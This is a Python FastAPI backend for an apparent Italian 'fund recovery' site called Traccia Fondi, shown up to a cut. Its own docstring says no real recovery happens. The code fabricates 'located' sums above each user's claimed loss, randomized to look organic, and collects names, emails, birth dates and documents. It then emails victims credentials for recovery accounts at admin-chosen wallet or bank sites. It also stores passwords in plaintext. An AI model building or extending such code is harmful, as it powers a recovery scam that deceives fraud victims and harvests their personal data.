"""
Traccia Fondi Backend (Code-based access)
============================================

NEW FLOW (v3):
- Users enter: first_name, last_name, email, access_code, amount_tier
- Optional: Upload proof documents
- Access code is set globally by admin (reusable for all users)
- One trace per email (cannot trace again with same email)
- Admin sets: access_code, destination_name, destination_url
- Admin sees all traces with user info, amount generated, documents, date/time

NOTE: This is an UI-driven product. The "tracing" is staged animation. There is
NO real fund recovery happening.
"""

from fastapi import FastAPI, APIRouter, Depends, HTTPException, Header, UploadFile, File, Request, Form
from dotenv import load_dotenv
from starlette.middleware.cors import CORSMiddleware
from motor.motor_asyncio import AsyncIOMotorClient
import os
import logging
import random
from pathlib import Path
from pydantic import BaseModel, Field, ConfigDict, EmailStr
from typing import List, Optional, Dict, Any
import uuid
from datetime import datetime, timezone, timedelta
import jwt
import cloudinary
import cloudinary.uploader
import resend
import asyncio
from collections import defaultdict, deque
import time as _time

ROOT_DIR = Path(__file__).parent
env_path = ROOT_DIR / ".env"

# Force load .env file - critical for production
if env_path.exists():
    load_dotenv(env_path, override=True)
    print(f"[STARTUP] Loaded .env from {env_path}")
else:
    print(f"[STARTUP] WARNING: .env not found at {env_path}")

# Get MongoDB URL with fallback
mongo_url = os.environ.get("MONGO_URL", os.getenv("MONGO_URL"))
if not mongo_url:
    raise RuntimeError(f"MONGO_URL not set! Check .env at {env_path}")

client = AsyncIOMotorClient(mongo_url)
db = client[os.environ.get("DB_NAME", "traccia_fondi")]

JWT_SECRET = os.environ.get("JWT_SECRET", "traccia-fondi-dev-secret-change-me")
JWT_ALG = "HS256"
JWT_EXP_HOURS = 24 * 7

ADMIN_EMAIL = os.environ.get("ADMIN_EMAIL", "admin@traccia-fondi.com").lower()
ADMIN_PASSWORD = os.environ.get("ADMIN_PASSWORD", "admin123")

# --- Cloudinary ---
cloudinary.config(
    cloud_name=os.environ.get("CLOUDINARY_CLOUD_NAME", ""),
    api_key=os.environ.get("CLOUDINARY_API_KEY", ""),
    api_secret=os.environ.get("CLOUDINARY_API_SECRET", ""),
    secure=True,
)
MAX_DOCS_PER_USER = 5
MAX_FILE_BYTES = 25 * 1024 * 1024  # 25 MB
ALLOWED_MIME = {
    "image/jpeg", "image/jpg", "image/png", "image/webp", "image/heic", "image/heif",
    "application/pdf",
}

# --- Resend (transactional email) ---
RESEND_API_KEY = os.environ.get("RESEND_API_KEY", "")
RESEND_FROM_RECOVERY = os.environ.get("RESEND_FROM_RECOVERY", "Traccia Fondi <recovery@traccia-fondi.com>")
RESEND_FROM_NOREPLY = os.environ.get("RESEND_FROM_NOREPLY", "Traccia Fondi <noreply@traccia-fondi.com>")
RESEND_REPLY_TO = os.environ.get("RESEND_REPLY_TO", "support@traccia-fondi.com")
if RESEND_API_KEY:
    resend.api_key = RESEND_API_KEY


# --- In-memory rate limiter (per IP, per route) ---
# Simple fixed-window-ish sliding bucket. For production scale you'd swap to Redis.
_rate_buckets: Dict[str, deque] = defaultdict(deque)


def _rate_limit(key: str, max_requests: int, window_seconds: int):
    """Raise 429 if `key` has made more than `max_requests` in the last window."""
    now = _time.time()
    q = _rate_buckets[key]
    # drop old entries
    while q and (now - q[0]) > window_seconds:
        q.popleft()
    if len(q) >= max_requests:
        retry = int(window_seconds - (now - q[0])) + 1
        raise HTTPException(
            status_code=429,
            detail=f"Too many requests. Please try again in {retry} seconds.",
        )
    q.append(now)

app = FastAPI(title="Traccia Fondi API", version="2.0.0")
api = APIRouter(prefix="/api")

# ============================================================
#   Helpers
# ============================================================

# Initialize logger early so it can be used throughout
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
logger = logging.getLogger("traccia-fondi")

def _now_iso() -> str:
    return datetime.now(timezone.utc).isoformat()


def _new_id() -> str:
    return str(uuid.uuid4())


def _make_token(sub: str, role: str) -> str:
    payload = {
        "sub": sub,
        "role": role,
        "exp": datetime.now(timezone.utc) + timedelta(hours=JWT_EXP_HOURS),
        "iat": datetime.now(timezone.utc),
    }
    return jwt.encode(payload, JWT_SECRET, algorithm=JWT_ALG)


def _decode_token(token: str) -> dict:
    try:
        return jwt.decode(token, JWT_SECRET, algorithms=[JWT_ALG])
    except jwt.ExpiredSignatureError:
        raise HTTPException(401, "Token expired")
    except Exception:
        raise HTTPException(401, "Invalid token")


def _bearer(authorization: Optional[str]) -> str:
    if not authorization or not authorization.lower().startswith("bearer "):
        raise HTTPException(401, "Missing bearer token")
    return authorization.split(" ", 1)[1].strip()


async def get_current_user(authorization: Optional[str] = Header(None)) -> Dict[str, Any]:
    payload = _decode_token(_bearer(authorization))
    if payload.get("role") != "user":
        raise HTTPException(403, "Forbidden")
    user = await db.users.find_one({"id": payload["sub"]}, {"_id": 0})
    if not user:
        raise HTTPException(401, "User not found")
    return user


async def require_admin(authorization: Optional[str] = Header(None)) -> Dict[str, Any]:
    payload = _decode_token(_bearer(authorization))
    if payload.get("role") != "admin":
        raise HTTPException(403, "Admin only")
    return payload


# Located amount per tier — well beyond the tier's high end so the user
# always sees a "bonus" amount discovered. Numbers are randomized inside
# the range so they look organic (e.g. 35,496 / 82,345 / 354,963).
TIER_HIGH_END = {
    "5000_20000":     (28000, 39999),
    "20000_50000":    (78000, 89999),
    "50000_100000":   (140000, 169999),
    "100000_plus":    (320000, 489999),
}


def _located_amount_for(tier: str) -> float:
    lo, hi = TIER_HIGH_END.get(tier, (18000, 19999))
    n = random.randint(lo, hi)
    # Add jitter on the units digit so it doesn't look round (e.g. 82345 not 82500)
    units = random.randint(0, 999)
    n = (n // 1000) * 1000 + units
    if n < lo: n = lo + units
    if n > hi: n = hi - random.randint(0, 500)
    # Add random cents for professional Italian formatting (e.g. €35.513,47)
    cents = random.randint(1, 99)
    return round(float(n) + cents / 100.0, 2)


# ============================================================
#   Schemas
# ============================================================

class HealthOut(BaseModel):
    status: str
    time: str


# --- Auth ---
class LoginIn(BaseModel):
    email: EmailStr
    password: str


class AuthOut(BaseModel):
    token: str
    user: Dict[str, Any]


# --- Admin user mgmt ---
class AdminUserIn(BaseModel):
    model_config = ConfigDict(extra="ignore")
    first_name: str
    last_name: str
    email: EmailStr
    password: str = Field(min_length=4, max_length=128)
    recovery_destination: str  # "chiantin_bank" | "zenthos_wallet"
    notes: Optional[str] = None


class AdminUserUpdate(BaseModel):
    model_config = ConfigDict(extra="ignore")
    first_name: Optional[str] = None
    last_name: Optional[str] = None
    email: Optional[EmailStr] = None
    password: Optional[str] = None
    recovery_destination: Optional[str] = None
    notes: Optional[str] = None


# --- User actions ---
class StartProcedureIn(BaseModel):
    amount_tier: str  # 5000_20000 / 20000_50000 / 50000_100000 / 100000_plus
    first_name: Optional[str] = None
    last_name: Optional[str] = None
    contact_email: Optional[EmailStr] = None
    date_of_birth: Optional[str] = None  # ISO date string YYYY-MM-DD


class RecoveryRequestIn(BaseModel):
    first_name: str
    last_name: str
    email: EmailStr
    message: Optional[str] = None


class RecoveryEmailUpdate(BaseModel):
    """Admin fills these to compose the email."""
    destination_login_email: Optional[str] = None
    destination_login_password: Optional[str] = None
    destination_login_url: Optional[str] = None
    extra_notes: Optional[str] = None


# --- NEW: Global Settings (admin-controlled) ---
class GlobalSettingsUpdate(BaseModel):
    access_code: Optional[str] = None
    destination_name: Optional[str] = None
    destination_url: Optional[str] = None


# --- NEW: Public Trace (code-based access) ---
class StartTraceIn(BaseModel):
    first_name: str = Field(min_length=1, max_length=100)
    last_name: str = Field(min_length=1, max_length=100)
    email: EmailStr
    access_code: str = Field(min_length=1, max_length=50)
    amount_tier: str  # 5000_20000 / 20000_50000 / 50000_100000 / 100000_plus


class CheckEmailIn(BaseModel):
    email: EmailStr


# ============================================================
#   Routes — health + auth
# ============================================================

@api.get("/health", response_model=HealthOut)
async def health():
    return HealthOut(status="ok", time=_now_iso())


@api.post("/auth/login", response_model=AuthOut)
async def login(body: LoginIn, request: Request):
    """
    Single login endpoint for both admin and regular users.
    - Admin: matches ADMIN_EMAIL/ADMIN_PASSWORD from .env.
    - Users: created by admin with plaintext passwords.
    Rate-limited: 8 attempts per IP per 5 minutes.
    """
    ip = request.client.host if request.client else "unknown"
    _rate_limit(f"login:{ip}", max_requests=8, window_seconds=300)

    em = body.email.lower().strip()

    if em == ADMIN_EMAIL and body.password == ADMIN_PASSWORD:
        return AuthOut(
            token=_make_token("admin", "admin"),
            user={"id": "admin", "email": ADMIN_EMAIL, "role": "admin", "first_name": "Admin", "last_name": ""},
        )

    user = await db.users.find_one({"email": em}, {"_id": 0})
    if not user or user.get("password") != body.password:
        raise HTTPException(401, "Invalid credentials")

    safe = {k: v for k, v in user.items() if k != "password"}
    safe["role"] = "user"
    return AuthOut(token=_make_token(user["id"], "user"), user=safe)


@api.post("/auth/register")
async def register_disabled():
    """Public registration is disabled in this product."""
    raise HTTPException(
        status_code=403,
        detail="Registration is currently unavailable. Please contact your administrator.",
    )


@api.get("/auth/me")
async def me(authorization: Optional[str] = Header(None)):
    payload = _decode_token(_bearer(authorization))
    if payload.get("role") == "admin":
        return {"id": "admin", "email": ADMIN_EMAIL, "role": "admin", "first_name": "Admin", "last_name": ""}
    user = await db.users.find_one({"id": payload["sub"]}, {"_id": 0, "password": 0})
    if not user:
        raise HTTPException(401, "User not found")
    user["role"] = "user"
    return user


# ============================================================
#   NEW: Global Settings (admin-controlled)
# ============================================================

DEFAULT_SETTINGS = {
    "id": "global",
    "access_code": "TRACE2026",
    "destination_name": "Zenthos Wallet",
    "destination_url": "https://zenthos-wallet.com",
}


async def get_settings() -> dict:
    """Get global settings, creating defaults if not exist."""
    settings = await db.settings.find_one({"id": "global"}, {"_id": 0})
    if not settings:
        await db.settings.insert_one(DEFAULT_SETTINGS.copy())
        return DEFAULT_SETTINGS.copy()
    return settings


@api.get("/settings")
async def public_get_settings():
    """Public endpoint - only returns destination_name (not code or URL)."""
    settings = await get_settings()
    return {"destination_name": settings.get("destination_name", "Zenthos Wallet")}


@api.get("/admin/settings")
async def admin_get_settings(_=Depends(require_admin)):
    """Admin: get all settings including access code."""
    return await get_settings()


@api.put("/admin/settings")
async def admin_update_settings(body: GlobalSettingsUpdate, _=Depends(require_admin)):
    """Admin: update global settings."""
    update = {k: v for k, v in body.model_dump().items() if v is not None}
    if not update:
        raise HTTPException(400, "No fields to update")
    await db.settings.update_one(
        {"id": "global"},
        {"$set": update},
        upsert=True
    )
    return await get_settings()


# ============================================================
#   NEW: Public Trace System (code-based access)
# ============================================================

@api.post("/trace/check-email")
async def check_email_used(body: CheckEmailIn, request: Request):
    """Check if an email has already been used for tracing."""
    ip = request.client.host if request.client else "unknown"
    _rate_limit(f"check-email:{ip}", max_requests=20, window_seconds=60)
    
    em = body.email.lower().strip()
    existing = await db.traces.find_one({"email": em})
    return {"used": existing is not None}


@api.post("/trace/start")
async def start_trace(body: StartTraceIn, request: Request):
    """
    Start a new trace. Validates access code, checks email uniqueness,
    generates located amount, and creates trace record.
    """
    ip = request.client.host if request.client else "unknown"
    _rate_limit(f"trace:{ip}", max_requests=5, window_seconds=300)
    
    # Validate amount tier
    if body.amount_tier not in TIER_HIGH_END:
        raise HTTPException(400, "Invalid amount_tier")
    
    # Get settings and validate code
    settings = await get_settings()
    if body.access_code.strip() != settings.get("access_code", ""):
        raise HTTPException(401, "Invalid access code")
    
    # Check email uniqueness
    em = body.email.lower().strip()
    existing = await db.traces.find_one({"email": em})
    if existing:
        raise HTTPException(400, "This email has already been used for a trace. Each email can only trace once.")
    
    # Generate located amount
    located = _located_amount_for(body.amount_tier)
    
    # Create trace record
    trace = {
        "id": _new_id(),
        "first_name": body.first_name.strip(),
        "last_name": body.last_name.strip(),
        "email": em,
        "amount_tier": body.amount_tier,
        "located_amount": located,
        "destination_name": settings.get("destination_name", "Zenthos Wallet"),
        "destination_url": settings.get("destination_url", ""),
        "documents": [],  # Will be populated via upload endpoint
        "status": "started",  # started | completed
        "created_at": _now_iso(),
        "completed_at": None,
    }
    await db.traces.insert_one(trace)
    trace.pop("_id", None)
    
    return {
        "trace_id": trace["id"],
        "located_amount": located,
        "destination_name": trace["destination_name"],
        "destination_url": trace["destination_url"],
    }


@api.post("/trace/{trace_id}/complete")
async def complete_trace(trace_id: str, request: Request):
    """Mark a trace as completed."""
    ip = request.client.host if request.client else "unknown"
    _rate_limit(f"trace-complete:{ip}", max_requests=10, window_seconds=60)
    
    trace = await db.traces.find_one({"id": trace_id})
    if not trace:
        raise HTTPException(404, "Trace not found")
    
    await db.traces.update_one(
        {"id": trace_id},
        {"$set": {"status": "completed", "completed_at": _now_iso()}}
    )
    return {"ok": True}


@api.get("/trace/{trace_id}")
async def get_trace(trace_id: str, request: Request):
    """Get trace details (public, for showing results)."""
    ip = request.client.host if request.client else "unknown"
    _rate_limit(f"trace-get:{ip}", max_requests=30, window_seconds=60)
    
    trace = await db.traces.find_one({"id": trace_id}, {"_id": 0})
    if not trace:
        raise HTTPException(404, "Trace not found")
    
    return trace


@api.post("/trace/{trace_id}/upload")
async def upload_trace_document(
    trace_id: str,
    file: UploadFile = File(...),
    request: Request = None
):
    """Upload a proof document for a trace."""
    ip = request.client.host if request.client else "unknown"
    _rate_limit(f"trace-upload:{ip}", max_requests=15, window_seconds=300)
    
    trace = await db.traces.find_one({"id": trace_id})
    if not trace:
        raise HTTPException(404, "Trace not found")
    
    # Check document limit
    current_docs = trace.get("documents", [])
    if len(current_docs) >= MAX_DOCS_PER_USER:
        raise HTTPException(400, f"Maximum {MAX_DOCS_PER_USER} documents per trace")
    
    # MIME check
    if file.content_type not in ALLOWED_MIME:
        raise HTTPException(400, f"File type not allowed: {file.content_type}")
    
    # Size check
    contents = await file.read()
    if len(contents) > MAX_FILE_BYTES:
        raise HTTPException(400, f"File too large (max {MAX_FILE_BYTES // (1024*1024)} MB)")
    
    # Upload to Cloudinary
    folder = f"traccia-fondi/traces/{trace_id}"
    is_pdf = file.content_type == "application/pdf"
    try:
        resource_type = "raw" if is_pdf else "image"
        result = cloudinary.uploader.upload(
            contents,
            folder=folder,
            resource_type=resource_type,
            use_filename=True,
            unique_filename=True,
            overwrite=False,
            tags=["traccia-fondi", "trace-doc", trace_id],
        )
    except Exception as e:
        logger.exception("Cloudinary upload failed")
        raise HTTPException(500, f"Upload failed: {e}")
    
    doc = {
        "id": _new_id(),
        "original_name": file.filename or "document",
        "mime_type": file.content_type,
        "size_bytes": len(contents),
        "cloudinary_public_id": result.get("public_id"),
        "cloudinary_resource_type": resource_type,
        "url": result.get("secure_url"),
        "created_at": _now_iso(),
    }
    
    await db.traces.update_one(
        {"id": trace_id},
        {"$push": {"documents": doc}}
    )
    
    return doc


# ============================================================
#   Admin: Traces Management
# ============================================================

@api.get("/admin/traces")
async def admin_list_traces(_=Depends(require_admin)):
    """Admin: list all traces with full details."""
    traces = await db.traces.find({}, {"_id": 0}).sort("created_at", -1).to_list(2000)
    return traces


@api.get("/admin/traces/{trace_id}")
async def admin_get_trace(trace_id: str, _=Depends(require_admin)):
    """Admin: get single trace with full details."""
    trace = await db.traces.find_one({"id": trace_id}, {"_id": 0})
    if not trace:
        raise HTTPException(404, "Trace not found")
    return trace


@api.delete("/admin/traces/{trace_id}")
async def admin_delete_trace(trace_id: str, _=Depends(require_admin)):
    """Admin: delete a trace and its documents from Cloudinary."""
    trace = await db.traces.find_one({"id": trace_id})
    if not trace:
        raise HTTPException(404, "Trace not found")
    
    # Delete documents from Cloudinary
    for doc in trace.get("documents", []):
        try:
            cloudinary.uploader.destroy(
                doc["cloudinary_public_id"],
                resource_type=doc.get("cloudinary_resource_type", "image"),
                invalidate=True,
            )
        except Exception:
            logger.warning("Cloudinary destroy failed for %s", doc.get("cloudinary_public_id"))
    
    await db.traces.delete_one({"id": trace_id})
    return {"ok": True}


# ============================================================
#   Admin user management (PLAINTEXT passwords visible) - LEGACY
# ============================================================

@api.get("/admin/users")
async def admin_list_users(_=Depends(require_admin)):
    users = await db.users.find({}, {"_id": 0}).sort("created_at", -1).to_list(2000)
    return users


@api.post("/admin/users")
async def admin_create_user(body: AdminUserIn, _=Depends(require_admin)):
    em = body.email.lower().strip()
    if await db.users.find_one({"email": em}):
        raise HTTPException(400, "Email already exists")
    if body.recovery_destination not in {"chiantin_bank", "zenthos_wallet"}:
        raise HTTPException(400, "Invalid recovery_destination")
    doc = {
        "id": _new_id(),
        "first_name": body.first_name.strip(),
        "last_name": body.last_name.strip(),
        "email": em,
        "password": body.password,  # PLAINTEXT — by admin requirement
        "recovery_destination": body.recovery_destination,
        "notes": body.notes or "",
        "amount_tier": None,
        "located_amount": 0,
        "procedure_started_at": None,
        "procedure_completed_at": None,
        "created_at": _now_iso(),
    }
    await db.users.insert_one(doc)
    doc.pop("_id", None)
    return doc


@api.put("/admin/users/{user_id}")
async def admin_update_user(user_id: str, body: AdminUserUpdate, _=Depends(require_admin)):
    update = {k: v for k, v in body.model_dump().items() if v is not None}
    if "email" in update:
        update["email"] = update["email"].lower().strip()
    if "recovery_destination" in update and update["recovery_destination"] not in {"chiantin_bank", "zenthos_wallet"}:
        raise HTTPException(400, "Invalid recovery_destination")
    res = await db.users.update_one({"id": user_id}, {"$set": update})
    if res.matched_count == 0:
        raise HTTPException(404, "User not found")
    return await db.users.find_one({"id": user_id}, {"_id": 0})


@api.delete("/admin/users/{user_id}")
async def admin_delete_user(user_id: str, _=Depends(require_admin)):
    await db.users.delete_one({"id": user_id})
    return {"ok": True}


# ============================================================
#   User flow — start procedure & dashboard state
# ============================================================

@api.post("/procedure/start")
async def start_procedure(body: StartProcedureIn, user=Depends(get_current_user)):
    if body.amount_tier not in TIER_HIGH_END:
        raise HTTPException(400, "Invalid amount_tier")
    located = _located_amount_for(body.amount_tier)
    update = {
        "amount_tier": body.amount_tier,
        "located_amount": located,
        "procedure_started_at": _now_iso(),
        "procedure_completed_at": None,
    }
    # Save the user-provided name/surname/email so the recovery-request form
    # can prefill them when the procedure completes.
    if body.first_name:    update["procedure_first_name"]   = body.first_name.strip()
    if body.last_name:     update["procedure_last_name"]    = body.last_name.strip()
    if body.contact_email: update["procedure_contact_email"] = body.contact_email.lower().strip()
    if body.date_of_birth: update["procedure_date_of_birth"] = body.date_of_birth.strip()
    await db.users.update_one({"id": user["id"]}, {"$set": update})
    return {**update, "recovery_destination": user.get("recovery_destination")}


@api.post("/procedure/complete")
async def complete_procedure(user=Depends(get_current_user)):
    update = {"procedure_completed_at": _now_iso()}
    await db.users.update_one({"id": user["id"]}, {"$set": update})
    return update


@api.get("/procedure/state")
async def procedure_state(user=Depends(get_current_user)):
    return {
        "amount_tier": user.get("amount_tier"),
        "located_amount": user.get("located_amount", 0),
        "recovery_destination": user.get("recovery_destination"),
        "procedure_started_at": user.get("procedure_started_at"),
        "procedure_completed_at": user.get("procedure_completed_at"),
        "procedure_first_name": user.get("procedure_first_name", ""),
        "procedure_last_name": user.get("procedure_last_name", ""),
        "procedure_contact_email": user.get("procedure_contact_email", ""),
        "procedure_date_of_birth": user.get("procedure_date_of_birth", ""),
    }


# ============================================================
#   Recovery requests
# ============================================================

@api.post("/recovery-requests")
async def create_recovery_request(body: RecoveryRequestIn, request: Request, user=Depends(get_current_user)):
    ip = request.client.host if request.client else "unknown"
    _rate_limit(f"recreq:{ip}", max_requests=5, window_seconds=600)
    doc = {
        "id": _new_id(),
        "user_id": user["id"],
        "user_email": user.get("email"),
        "first_name": body.first_name.strip(),
        "last_name": body.last_name.strip(),
        "email": body.email.lower().strip(),
        "message": (body.message or "").strip(),
        "located_amount": user.get("located_amount", 0),
        "recovery_destination": user.get("recovery_destination"),
        "status": "pending",  # pending | sent | done
        # Admin-filled credentials (empty until admin types them)
        "destination_login_email": "",
        "destination_login_password": "",
        "destination_login_url": "",
        "extra_notes": "",
        "created_at": _now_iso(),
        "sent_at": None,
    }
    await db.recovery_requests.insert_one(doc)
    doc.pop("_id", None)
    return doc


@api.get("/admin/recovery-requests")
async def admin_list_requests(_=Depends(require_admin)):
    docs = await db.recovery_requests.find({}, {"_id": 0}).sort("created_at", -1).to_list(2000)
    return docs


@api.put("/admin/recovery-requests/{req_id}")
async def admin_update_request(req_id: str, body: RecoveryEmailUpdate, _=Depends(require_admin)):
    update = {k: v for k, v in body.model_dump().items() if v is not None}
    res = await db.recovery_requests.update_one({"id": req_id}, {"$set": update})
    if res.matched_count == 0:
        raise HTTPException(404, "Request not found")
    return await db.recovery_requests.find_one({"id": req_id}, {"_id": 0})


@api.post("/admin/recovery-requests/{req_id}/mark-sent")
async def admin_mark_sent(req_id: str, _=Depends(require_admin)):
    await db.recovery_requests.update_one(
        {"id": req_id},
        {"$set": {"status": "sent", "sent_at": _now_iso()}},
    )
    return await db.recovery_requests.find_one({"id": req_id}, {"_id": 0})


@api.post("/admin/recovery-requests/{req_id}/send-email")
async def admin_send_email(req_id: str, _=Depends(require_admin)):
    """
    Admin sends the recovery-instructions email via Resend.
    Requires the admin to have filled destination_login_email and
    destination_login_password on the request first.
    """
    r = await db.recovery_requests.find_one({"id": req_id}, {"_id": 0})
    if not r:
        raise HTTPException(404, "Request not found")
    if not r.get("destination_login_email") or not r.get("destination_login_password"):
        raise HTTPException(400, "Fill destination_login_email and destination_login_password first")
    if not RESEND_API_KEY:
        raise HTTPException(500, "Resend API key is not configured")

    dest_label = "Zenthos Wallet" if r.get("recovery_destination") == "zenthos_wallet" else "Chiantin Bank"
    default_url = (
        "https://app.zenthos-wallet.com/login"
        if r.get("recovery_destination") == "zenthos_wallet"
        else "https://secure.chiantin-bank.com/login"
    )
    login_url = (r.get("destination_login_url") or default_url).strip()
    amount = f"€ {(r.get('located_amount') or 0):,.2f}".replace(",", "X").replace(".", ",").replace("X", ".")
    extra = (r.get("extra_notes") or "").strip()

    subject = f"[Traccia Fondi] Istruzioni di recupero — {dest_label} — {amount}"
    text_body = (
        f"Gentile {r.get('first_name','')} {r.get('last_name','')},\n\n"
        f"A seguito del completamento della procedura di tracciamento Traccia Fondi, "
        f"confermiamo che un importo di {amount} associato al suo caso è stato localizzato presso:\n\n"
        f"  {dest_label}\n\n"
        f"Le sue credenziali di accesso al conto di recupero sono:\n\n"
        f"  URL accesso: {login_url}\n"
        f"  Email:       {r['destination_login_email']}\n"
        f"  Password:    {r['destination_login_password']}\n\n"
        f"Acceda al suo account per verificare i fondi localizzati e seguire le istruzioni a schermo "
        f"per completare la procedura di recupero.\n\n"
        + (f"Note aggiuntive:\n{extra}\n\n" if extra else "")
        + "Importante: mantenga riservate le credenziali. Traccia Fondi non le chiederà mai di "
        "condividere password, codici OTP, seed phrase, o di installare software di accesso remoto.\n\n"
        "Cordiali saluti,\n"
        "Traccia Fondi — Recovery Operations\n"
        "support@traccia-fondi.com"
    )

    html_body = f"""<!doctype html>
<html><body style="margin:0;padding:0;background:#06122A;font-family:Arial,sans-serif;color:#E6EDF7">
<table width="100%" cellpadding="0" cellspacing="0" style="background:#06122A">
<tr><td align="center" style="padding:32px 16px">
  <table width="600" cellpadding="0" cellspacing="0" style="max-width:600px;background:#0E1A36;border:1px solid #1f2d4f;border-radius:14px;overflow:hidden">
    <tr><td style="padding:24px 32px;background:linear-gradient(90deg,#5FE3C9,#6E8BFF)">
      <div style="font-weight:800;color:#06122A;font-size:22px;letter-spacing:-0.02em">Traccia Fondi</div>
      <div style="color:#06122A;opacity:0.85;font-size:11px;letter-spacing:0.18em;text-transform:uppercase;margin-top:2px">Istruzioni di recupero</div>
    </td></tr>
    <tr><td style="padding:28px 32px;color:#E6EDF7;font-size:14px;line-height:1.6">
      <p>Gentile <strong>{r.get('first_name','')} {r.get('last_name','')}</strong>,</p>
      <p>A seguito del completamento della procedura di tracciamento Traccia Fondi, confermiamo che un importo di
        <strong style="color:#5FE3C9">{amount}</strong> associato al suo caso è stato localizzato presso:</p>
      <div style="background:#06122A;border:1px solid #1f2d4f;border-radius:10px;padding:16px;margin:16px 0">
        <div style="color:#9FB0CC;font-size:11px;letter-spacing:0.18em;text-transform:uppercase">Posizione</div>
        <div style="color:#fff;font-size:18px;font-weight:700;margin-top:4px">{dest_label}</div>
      </div>
      <p>Le credenziali di accesso al conto di recupero sono:</p>
      <table cellpadding="0" cellspacing="0" style="background:#06122A;border:1px solid #1f2d4f;border-radius:10px;width:100%;margin:8px 0 16px 0">
        <tr><td style="padding:12px 16px;border-bottom:1px solid #1f2d4f"><span style="color:#9FB0CC;font-size:11px;letter-spacing:0.16em;text-transform:uppercase">URL</span><br/><a href="{login_url}" style="color:#5FE3C9;text-decoration:none;word-break:break-all">{login_url}</a></td></tr>
        <tr><td style="padding:12px 16px;border-bottom:1px solid #1f2d4f"><span style="color:#9FB0CC;font-size:11px;letter-spacing:0.16em;text-transform:uppercase">Email</span><br/><span style="color:#fff;font-family:monospace">{r['destination_login_email']}</span></td></tr>
        <tr><td style="padding:12px 16px"><span style="color:#9FB0CC;font-size:11px;letter-spacing:0.16em;text-transform:uppercase">Password</span><br/><span style="color:#fff;font-family:monospace">{r['destination_login_password']}</span></td></tr>
      </table>
      <p>Acceda al suo account per verificare i fondi localizzati e seguire le istruzioni a schermo per completare la procedura di recupero.</p>
      {f'<div style="background:#06122A;border-left:3px solid #FFB454;padding:12px 16px;margin:16px 0;color:#9FB0CC"><strong style="color:#FFB454">Note aggiuntive</strong><br/>{extra}</div>' if extra else ""}
      <div style="background:rgba(255,107,122,0.08);border:1px solid rgba(255,107,122,0.3);border-radius:10px;padding:14px;margin:20px 0;color:#FF8B6A;font-size:13px">
        <strong>Importante:</strong> Traccia Fondi non le chiederà mai di condividere password, codici OTP, seed phrase, o di installare software di accesso remoto. Mantenga le credenziali riservate.
      </div>
      <p style="color:#9FB0CC;font-size:13px;margin-top:24px">Cordiali saluti,<br/><strong style="color:#fff">Traccia Fondi — Recovery Operations</strong><br/><a href="mailto:support@traccia-fondi.com" style="color:#5FE3C9">support@traccia-fondi.com</a></p>
    </td></tr>
    <tr><td style="padding:14px 32px;background:#06122A;border-top:1px solid #1f2d4f;color:#6F7E9C;font-size:11px;text-align:center">
      © {datetime.now(timezone.utc).year} Traccia Fondi · Privacy-first · GDPR aware
    </td></tr>
  </table>
</td></tr>
</table>
</body></html>"""

    try:
        # resend SDK is sync; run in executor to avoid blocking event loop
        loop = asyncio.get_event_loop()
        send_result = await loop.run_in_executor(
            None,
            lambda: resend.Emails.send({
                "from": RESEND_FROM_RECOVERY,
                "to": [r["email"]],
                "reply_to": RESEND_REPLY_TO,
                "subject": subject,
                "text": text_body,
                "html": html_body,
                "tags": [{"name": "type", "value": "recovery_instructions"}],
            }),
        )
        message_id = (send_result or {}).get("id", "")
    except Exception as e:
        logger.exception("Resend send failed")
        raise HTTPException(500, f"Email send failed: {e}")

    await db.recovery_requests.update_one(
        {"id": req_id},
        {"$set": {
            "status": "sent",
            "sent_at": _now_iso(),
            "email_message_id": message_id,
            "email_provider": "resend",
        }},
    )
    return await db.recovery_requests.find_one({"id": req_id}, {"_id": 0})


@api.delete("/admin/recovery-requests/{req_id}")
async def admin_delete_request(req_id: str, _=Depends(require_admin)):
    await db.recovery_requests.delete_one({"id": req_id})
    return {"ok": True}


# ============================================================
#   Documents — Cloudinary signed uploads (per user)
# ============================================================

@api.get("/documents")
async def list_documents(user=Depends(get_current_user)):
    """List all documents uploaded by the current user."""
    docs = await db.documents.find(
        {"user_id": user["id"]}, {"_id": 0}
    ).sort("created_at", -1).to_list(50)
    return docs


@api.post("/documents/upload")
async def upload_document(file: UploadFile = File(...), user=Depends(get_current_user)):
    """
    Upload a single document for the current user. The file is sent to
    Cloudinary using server-side signed upload (the user never sees Cloudinary
    credentials and we control the folder/limits).
    """
    # Per-user document cap
    count = await db.documents.count_documents({"user_id": user["id"]})
    if count >= MAX_DOCS_PER_USER:
        raise HTTPException(400, f"Maximum {MAX_DOCS_PER_USER} documents per user")

    # MIME check
    if file.content_type not in ALLOWED_MIME:
        raise HTTPException(400, f"File type not allowed: {file.content_type}")

    # Size check (read into memory — fine for our 25 MB cap)
    contents = await file.read()
    if len(contents) > MAX_FILE_BYTES:
        raise HTTPException(400, f"File too large (max {MAX_FILE_BYTES // (1024*1024)} MB)")

    # Upload to Cloudinary
    folder = f"traccia-fondi/users/{user['id']}"
    is_pdf = file.content_type == "application/pdf"
    try:
        # 'auto' resource_type lets Cloudinary handle PDFs as 'image' for thumbnails too,
        # but we use 'raw' for PDFs to keep them as-is and 'image' for images.
        resource_type = "raw" if is_pdf else "image"
        result = cloudinary.uploader.upload(
            contents,
            folder=folder,
            resource_type=resource_type,
            use_filename=True,
            unique_filename=True,
            overwrite=False,
            tags=["traccia-fondi", "user-doc", user["id"]],
        )
    except Exception as e:
        logger.exception("Cloudinary upload failed")
        raise HTTPException(500, f"Upload failed: {e}")

    doc = {
        "id": _new_id(),
        "user_id": user["id"],
        "original_name": file.filename or "document",
        "mime_type": file.content_type,
        "size_bytes": len(contents),
        "cloudinary_public_id": result.get("public_id"),
        "cloudinary_resource_type": resource_type,
        "url": result.get("secure_url"),
        "thumbnail_url": (result.get("secure_url") if not is_pdf else None),
        "created_at": _now_iso(),
    }
    await db.documents.insert_one(doc)
    doc.pop("_id", None)
    return doc


@api.delete("/documents/{doc_id}")
async def delete_document(doc_id: str, user=Depends(get_current_user)):
    """Delete a document the user owns (also removes it from Cloudinary)."""
    d = await db.documents.find_one({"id": doc_id, "user_id": user["id"]}, {"_id": 0})
    if not d:
        raise HTTPException(404, "Document not found")
    try:
        cloudinary.uploader.destroy(
            d["cloudinary_public_id"],
            resource_type=d.get("cloudinary_resource_type", "image"),
            invalidate=True,
        )
    except Exception:
        logger.warning("Cloudinary destroy failed for %s", d["cloudinary_public_id"])
    await db.documents.delete_one({"id": doc_id})
    return {"ok": True}


@api.get("/admin/users/{user_id}/documents")
async def admin_list_user_documents(user_id: str, _=Depends(require_admin)):
